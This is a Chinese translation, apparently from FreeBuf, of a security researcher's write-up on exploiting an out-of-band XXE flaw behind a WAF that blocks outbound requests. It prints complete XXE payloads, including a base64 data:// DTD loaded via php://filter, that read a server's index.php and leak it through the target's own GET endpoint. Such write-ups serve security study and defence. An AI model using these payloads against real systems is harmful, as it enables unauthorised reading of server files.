![](https://image.3001.net/images/20190819/1566204995_5d5a6443838d1.jpg!small)

**几个星期以前，作者在某个OOB-XXE漏洞测试中遇到过这样一种场景：目标应用后端系统WAF防火墙阻挡了包含DNS解析在内的所有出站请求（Outgoing
Request），但最终，通过利用php://filter//的封装协议，作者成功实现了OOB-XXE漏洞测试。以下是其分享：**

在对目标应用的测试分析时，我偶然发现了其中一个路径调用了一个名为xml的参数，但其对应的XML数据值是加密的。之后，我发现该xml参数的XML数据在发送到HTTP请求前仅在客户端实行了加密，也就是说，其应用后端可能未设置对这些XML数据进行必要验证的措施，这样，我就想到能否修改这些XML数据以便注入XXE
Payload。

接下来，首先我要找到加密XML数据的JavaScript函数，但却发现目标应用的JavaScript全被静态模块打包器WebPack打包且非常不具可读性和跟踪分析性。所以，要找到JavaScript加密函数是件麻烦事，之后，我想到了在Chrome浏览器工具中设置断点，在XML数据发送到JavaScript加密函数前对它进行修改。

![](https://image.3001.net/images/20190819/1566204739_5d5a634369a58.jpg!small)

这样一来，我就可以在其中加入外部实体（external entity）进行XML数据构造了，但当我把构造好的XML
Payload发送后，目标应用好长时间才有响应"Error while parsing XML"。但当我把其中的外部实体（external
entity）修改为 `<http://localhost/>`
后，目标应用却能及时无误的响应。这种情况，我认为目标应用环境中可能部署有WAF防火墙，它会把一些出站请求拒绝掉。之后，我又尝试了端口和DNS解析请求，但都没成功。

也就是说，现在我面前存在一个XXE漏洞，但是却无能为力。一般来说可能通过探测目标应用内网环境中开放的端口来实现XXE利用，但其WAF防火墙却阻挡了所有出站请求。由于其WAF防火墙未阻止本机用为外部实体，所以，我想找到目标应用公开具备的，不需cookie验证且使用GET参数的路径来实现对某些数据的更改或添加。而这也和目标应用的工作机制非常相符，因为它好多路径并未采用cookie验证和用户ID参数的形式来验证身份。

考虑到这一点，我就开始认真分析查找，最后聚集于一个路径<http://target/endpoint.php?sid=>[session_id]&key=xxe&val=test，它会调用三个参数：sid、key和val，并把key和val保存到相应的会话ID账户中，而且我们通过访问该路径就可以获取这三个参数值。

所以，现在我就想构造一个向路径<http://target/endpoint.php?sid=>[session_id]&key=xxe&val=test发送GET请求的外部实体，之后看看该路径下的xxe和test值是否已经会发生添加更改，因此，我构造的XXE
Payload如下，并把它执行了发送：

    
    
    <!DOCTYPE foo [  
    
           <!ELEMENT foo ANY >
    
           <!ENTITY xxe SYSTEM "<http://target/endpoint.php?sid=>[session_id]&key=xxe&val=test">
    
        ]>
    
        <paramlimits>
    
          <component name="L1" min="2" max="100">&ampxxe</component>
    
        </paramlimits>

之后，当我来到 <http://target/endpoint.php?sid=>[session_id]
下，我发现sid值已经被添加更改，也就是说，目标应用服务器能正常获取上述实体，并会向提供的路径发送GET请求。如下：

![](https://image.3001.net/images/20190819/1566204804_5d5a63847d4af.jpg!small)

现在思路就慢慢清晰了，至少可以证明其XXE漏洞是存在的，我想深入利用看看能否可读取到目标应用的一些本地文件。要读取本地文件，我们需要创建一个获取文件的参数实体，以及另一个调用该参数实体的实体，为此，我用到了外部文档类型定义（DTD）文件的调用，但问题还是一样，被WAF防火墙阻挡了出站的调用请求，部署在我服务器上的DTD文件不能被正常调用。

这样来说，还是防火墙在作怪，如何来绕过它呢？我想能否存在一种允许文件上传的路径，这样我就能上传我的构造DTD文件，但是，目标应用却根本没任何文件上传功能。一番倒腾之后，我差点放弃了，但是我想到目标应用是PHP架构的，那我想应该可以用php://封装协议的封装器去获取
data:// URI中的资源吧，这样不就能调用到我的DTD文件了吗？

所以，可以定义这样一种参数实体：

    
    
    <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///D:/path/index.php">
    
        <!ENTITY % param1 '<!ENTITY exfil SYSTEM "<http://target/endpoint.php?sid=>[session_id]&#38;key=xxe&#38;val=%data;">'>

然后把上述参数实体经base64编码后，利用php://封装协议来请求它，如下：

    
    
    php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgJSBkYXRhIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1maWxlOi8vL0Q6L3BhdGgvaW5kZXgucGhwIj4NCjwhRU5USVRZICUgcGFyYW0xICc8IUVOVElUWSBleGZpbCBTWVNURU0gImh0dHA6Ly90YXJnZXQvZW5kcG9pbnQucGhwP3NpZD1bc2Vzc2lvbl9pZF0mIzM4O2tleT14eGUmIzM4O3ZhbD0lZGF0YTsiPic+

当目标应用的XML解析器执行解析时，它会执行以下两个路径的实体解析：

    
    
    php://filter/convert.base64-encode/resource=file:///D:/path/index.php    
    
        
    
            <http://target/endpoint.php?sid=>[session_id]&#38;key=xxe&#38;val=%data;

其中的convert.base64-encode是为了能对 index.php 文件内容更方便的获取。所以最终的XXE Payload为：

    
    
    <!DOCTYPE r [
    
          <!ELEMENT r ANY >
    
          <!ENTITY % sp SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgJSBkYXRhIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1maWxlOi8vL0Q6L3BhdGgvaW5kZXgucGhwIj4NCjwhRU5USVRZICUgcGFyYW0xICc8IUVOVElUWSBleGZpbCBTWVNURU0gImh0dHA6Ly90YXJnZXQvZW5kcG9pbnQucGhwP3NpZD1bc2Vzc2lvbl9pZF0mIzM4O2tleT14eGUmIzM4O3ZhbD0lZGF0YTsiPic+"> %sp; %param1;
    
        ]>
    
        <paramlimits>
    
          <component name="L1" min="2" max="100">&ampexfil</component>
    
        </paramlimits>

提交发送之后，来到目标路径<http://target/endpoint.php?sid=>[session_id]下，可以发现经base64编码的index.php文件内容被成功获取：

![](https://image.3001.net/images/20190819/1566204876_5d5a63cc91a75.jpg!small)当然，深入利用之后就能用这种方法来读取一些敏感的本地文件了。

***参考来源：[mahmoudsec](https://mahmoudsec.blogspot.com/2019/08/exploiting-out-of-band-xxe-using.html)，clouds编译整理，转载请注明来自FreeBuf.COM**

  

